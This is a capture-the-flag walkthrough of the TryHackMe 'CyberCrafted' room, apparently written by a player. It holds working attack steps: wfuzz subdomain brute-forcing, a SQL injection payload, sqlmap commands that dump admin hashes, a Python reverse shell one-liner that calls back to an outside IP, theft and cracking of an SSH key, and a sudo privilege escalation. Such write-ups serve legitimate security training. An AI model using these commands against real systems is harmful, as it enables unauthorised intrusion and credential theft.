# CyberCrafted

“Pwn this pay-to-win Minecraft server!”

![Untitled](CyberCraft%203b849/Untitled.png)

Difficulty : Medium

## 1- Scanning And Enumeration

Now let’s start by running a scan on the network!

So now we know that port 22, 80 and 25565 are open, lets check out the port 80 HTTP page first!

![Untitled](CyberCraft%203b849/Untitled%201.png)

Before you visit the page make sure you add the IP of the room in the `/etc/hosts` page with the domain name cybercrafted.thm like so.

![Untitled](CyberCraft%203b849/Untitled%202.png)

Now we can visit the webpage without any problems.

At first I found nothing but we have a small hint the source code of the home page.

![Untitled](CyberCraft%203b849/Untitled%203.png)

## 2- Finding the Subdomains

Now we know that some subdomains do exists on the website, to find them we can use any subdomain finder in this case I will be using `wfuzz`.

And I will be using top-5000 subdomains wordlists : 

[](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt)

Now lets get to bruteforcing!

Command Used : ```

```bash
wfuzz -c -f sub-fighter -w subdomains-top1million-5000.txt -u '[http://cybercrafted.thm](http://cybercrafted.thm/)' -H "Host: FUZZ.cybercrafted.thm" --sc 200 --hw 290
```

After running this I found one interesting subdomain which was `admin.`

![Untitled](CyberCraft%203b849/Untitled%204.png)

To actually access the subdomain you will have to add the following in the `/etc/hosts` file.

![Untitled](CyberCraft%203b849/Untitled%205.png)

But one of the question on THM was asking for 3 subdomains but we only found 2 yet, so I changed the command a bit and found the 3rd subdomain, `store`

Command used : ```

```bash
wfuzz -c -f sub-fighter -w subdomains-top1million-5000.txt -u '[http://cybercrafted.thm](http://cybercrafted.thm/)' -H "Host: FUZZ.cybercrafted.thm" --sc 200,402,403 --hw 290
```

Now you can also add the subdomain `store.` in the `/etc/hosts` file to access it.

## 3- Exploring The Webpages and Subdomains

Now we have the subdomains and the webpages, now we gotta find a hint to move forward, so I started with a gobuster scan on the main webpage.

![Untitled](CyberCraft%203b849/Untitled%206.png)

We find `/secret` here, this directory just has some classic minecraft images which lead to nothing.

![Untitled](CyberCraft%203b849/Untitled%207.png)

Now let’s run a scan on `store.` subdomain.

![Untitled](CyberCraft%203b849/Untitled%208.png)

After running the scan for a while, I didn’t find anything and I was stuck but then I decided to run the scan again but with extensions like `.txt,.php`. And instantly after running the scan I find a interesting file. 

![Untitled](CyberCraft%203b849/Untitled%209.png)

## 5- SQL Injection!

Now we have the page ready to access, now I tried various things on the search field but couldn’t find anything interesting. 

![Untitled](CyberCraft%203b849/Untitled%2010.png)

So now the last thing I tried was a basic SQLI payload and it worked! as I could see the every item on the shop

![Untitled](CyberCraft%203b849/Untitled%2011.png)

Payload used : `or 1=1 -- -`

Now we can catch this request using `burpsuite` and feed it to `sqlmap` and get more information!

![Untitled](CyberCraft%203b849/Untitled%2012.png)

To save the request you can right click and then click on Save Item and you will be able to save the request easily.

Now let’s feed it to `sqlmap` to find out some databases!

![Untitled](CyberCraft%203b849/Untitled%2013.png)

After the scan we get multiple databases!

![Untitled](CyberCraft%203b849/Untitled%2014.png)

Out of all of them `webapp` seems to be interesting, let’s find the tables of the database. 

Command used : `sqlmap -r req.req -D webapp --tables`

![Untitled](CyberCraft%203b849/Untitled%2015.png)

We have to tables, let’s look at the columns of these tables. 

Now we have the both columns of the tables and table `admin` looks interesting as it has the `hash` column, let dump it. 

Command used : `sqlmap -r req.req -D webapp -T admin -C hash --dump`

Now we have the hash and a flag! 

![Untitled](CyberCraft%203b849/Untitled%2016.png)

And at the end we also have the usernames! 

![Untitled](CyberCraft%203b849/Untitled%2017.png)

Now we can crack the hash using [crackstation.net](http://crackstation.net) 

## 6- Exploring The Admin Dashboard

Now we have the username and password let’s log into the admin page.

Once we login we get a system command panel where we can execute several commands on the system, and it doesn't have any sanitizing happening in the background which makes the process more easier for us.

![Untitled](CyberCraft%203b849/Untitled%2018.png)

First thing I wanted to do was getting a reverse shell, to do so I need a program like python, bash, ruby or anything. 

To find whether the system has python or any other program I ran the following command. 

![Untitled](CyberCraft%203b849/Untitled%2019.png)

Now we know that the system has python3 installed, so now we can use the following reverse shell.

```python
/usr/bin/python3.6 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.44.71",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now we can set up a listener on our system to receive the call from the Minecraft server.

![Untitled](CyberCraft%203b849/Untitled%2020.png)

Now we can execute the command and we will receive the connection! 

![Untitled](CyberCraft%203b849/Untitled%2021.png)

Now let’s try to find something interesting. 

So I decided to go to `/home` directory and then cd’ed into the `xxultimatecreeperxx` directory, which was empty but after running the command `ls -la` it revealed its secrets. 

![Untitled](CyberCraft%203b849/Untitled%2022.png)

We have a `.ssh` directory which has `id_rsa` which is readable, let’s get the file. 

![Untitled](CyberCraft%203b849/Untitled%2023.png)

## 7- Cracking RSA Key

Now let’s save the key in our system and crack it using `ssh2john`

First we need to convert it into a hash. 

![Untitled](CyberCraft%203b849/Untitled%2024.png)

Now we need to crack the hash using `john` 

Command used : `john hash -wordlist=/usr/share/wordlists/rockyou.txt` 

And now we have the password!

![Untitled](CyberCraft%203b849/Untitled%2025.png)

Now we can log into the SSH service but before doing so we have to give the necessary permissions to our `id_rsa` file using `chmod`. 

![Untitled](CyberCraft%203b849/Untitled%2026.png)

Now we can log in!

## 8- Enumerating The SSH

NOW WE ARE IN!

![Untitled](CyberCraft%203b849/Untitled%2027.png)

Let’s try to find the Minecraft server flag now.

After some searching I found the directory `/opt/minecraft` which had the flag init. 

![Untitled](CyberCraft%203b849/Untitled%2028.png)

Now the next question asks us for the “sketchy plugin”

So now I cd’d into the `cybercrafted` folder and found various folders there, the one that caught my attention was “plugins”. So I decided to visit the folder and found a plugin named `LoginSystem`

![Untitled](CyberCraft%203b849/Untitled%2029.png)

So now inside the `LoginSystem` directory we can see a file names `log.txt` on visiting the file we find various password, one of them being cybercrafted’s password!

![Untitled](CyberCraft%203b849/Untitled%2030.png)

Now we can get the user flag by using the user cybercraft. 

![Untitled](CyberCraft%203b849/Untitled%2031.png)

Now let’s go to his home directory and get the flag!

![Untitled](CyberCraft%203b849/Untitled%2032.png)

## 9- Privilege Escalation

Now we have the user flag its time to get the root one!

So now I tried executing `sudo -l` to check some interesting files (if any) and I found one.

![Untitled](CyberCraft%203b849/Untitled%2033.png)

So I checked the gtfobins page for the following and found this. 

![Untitled](CyberCraft%203b849/Untitled%2034.png)

But the system doesn’t allow us to run the command, So I decided the run the exact command given my the `sudo` command. 

The following command takes up to a *“Minecraft controlled cli”* something, though we are root in this *cli* we still can’t do anything as this is a Minecraft cli, so we need to come out of this screen.

After some hints from the tryhackme discord I found out that we have to spawn a new screen which can be done using shortcut key `control+a and control+c`

And by doing so we now have the room perms! 

![Untitled](CyberCraft%203b849/Untitled%2035.png)